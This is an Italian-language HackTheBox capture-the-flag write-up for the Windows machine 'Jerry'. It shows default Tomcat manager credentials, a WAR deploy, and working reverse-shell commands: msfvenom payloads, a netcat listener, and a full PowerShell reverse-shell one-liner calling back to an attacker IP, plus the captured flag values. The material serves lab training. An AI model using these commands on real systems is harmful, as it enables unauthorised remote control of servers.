# Jerry

**Platform:** HackTheBox  
**OS:** Windows  
**Difficulty:** Easy  
**IP:** 10.129.136.9

---

## Recon

### Nmap

```
nmap -sV -sC -p- -Pn -n -A jerry
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
```

### Open Ports Summary

|Port|Service|Version|
|---|---|---|
|8080|HTTP|Apache Tomcat 7.0.88|

---

## Findings

### Web (Port 8080)

Navigando su `http://10.129.136.9:8080` viene presentata la pagina di default di Apache Tomcat 7.0.88. Dalla pagina home sono visibili tre pulsanti in alto a destra: **Server Status**, **Manager App**, **Host Manager**.

![Tomcat default page](Pasted%20image%2020260419110538.png)

**Server Status** (`/manager/status`) — accessibile con credenziali `admin:admin` (default). Rivela informazioni critiche sull'ambiente:

- OS: Windows Server 2012 R2
- JVM: 1.8.0_171-b11 (Oracle)
- Hostname: JERRY
- Architecture: amd64

![Server Status](Pasted%20image%2020260419110515.png)

**Manager App** (`/manager/html`) — tentando l'accesso, Tomcat restituisce un **403** che nella pagina di errore suggerisce esplicitamente un esempio di configurazione con username `tomcat` e password `s3cret`. Queste credenziali risultano valide.

![Manager App access](Pasted%20image%2020260419111136.png)

### Credentials Found

|Username|Password|Where Found|
|---|---|---|
|admin|admin|Default credentials — Server Status|
|tomcat|s3cret|Suggerite nella pagina di errore 403|

---

## Foothold

### Vulnerability

Il Tomcat Web Application Manager (autenticato) permette il deploy di file WAR arbitrari. Tomcat esegue il servizio come `NT AUTHORITY\SYSTEM`, quindi qualunque WAR deployato ottiene immediatamente i privilegi più alti sul sistema.

### Exploit

Generazione del payload WAR con msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f war -o shell.war
```

Verifica del contenuto del WAR per identificare il nome reale del JSP generato:

```bash
unzip -l shell.war
# Output: lfvomkalbh.jsp
```

> **Nota:** msfvenom genera il nome del file JSP in modo casuale — non assumere `shell.jsp`. Verificare sempre con `unzip -l`.

Deploy del WAR tramite il Manager GUI (Browse → Deploy), oppure via curl:

```bash
curl -u 'tomcat:s3cret' --upload-file shell.war \
  "http://10.129.136.9:8080/manager/text/deploy?path=/shell&update=true"
```

Avvio del listener:

```bash
nc -lvnp 4444
```

Trigger della reverse shell:

```bash
curl "http://10.129.136.9:8080/shell/lfvomkalbh.jsp"
```

![msfvenom + deploy + trigger](Pasted%20image%2020260419112402.png)

### Shell Obtained

```
User:   nt authority\system
Method: Reverse shell via WAR deploy su Tomcat Manager
```

---

## Privilege Escalation

Non necessaria — Tomcat girava già come `NT AUTHORITY\SYSTEM`. Shell ottenuta direttamente con i massimi privilegi.

---

## Flags

Le flag si trovano entrambe in un unico file sul Desktop dell'Administrator ("2 for the price of 1"):

```
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

```
user.txt: 7004dbcef0f854e0fb401875f26ebd00
root.txt: 04a8b36e1545a455393d067e772fe90e
```

---

## Loot

|Tipo|Valore|
|---|---|
|Credentials|tomcat:s3cret (Tomcat Manager)|
|Credentials|admin:admin (Server Status)|

---

## Alternative: Shell Interattiva

La JSP shell generata da msfvenom è basilare: esegue comandi tramite `Runtime.exec()` senza una vera shell interattiva. Questo significa niente `cd`, niente path relativo, niente tab completion.

**Opzione 1 — Meterpreter:** usare un payload diverso in msfvenom:

```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f war -o meter.war
```

Con `multi/handler` in Metasploit si ottiene una sessione Meterpreter completa.

**Opzione 2 — PowerShell reverse shell:** dalla JSP shell, lanciare come comando:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.32',4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Con un listener `nc -lvnp 4445` separato si ottiene una PowerShell interattiva completa.

---

## Lessons Learned

1. **Le pagine di errore parlano:** il 403 di Tomcat Manager conteneva esplicitamente le credenziali di esempio (`tomcat:s3cret`) — leggere sempre i messaggi di errore per intero prima di procedere con brute force.
2. **Default credentials funzionano ancora:** `admin:admin` su Server Status — sugli ambienti HTB (e purtroppo su molti ambienti reali) le credenziali di default non vengono mai cambiate.
3. **Verificare il contenuto dei WAR:** msfvenom genera nomi JSP casuali — non assumere il nome del file, verificare sempre con `unzip -l` prima di triggerare.
4. **Qualità della shell:** `jsp_shell_reverse_tcp` è funzionale ma limitato. Per ambienti più complessi preferire Meterpreter o pivotare subito a una PowerShell interattiva.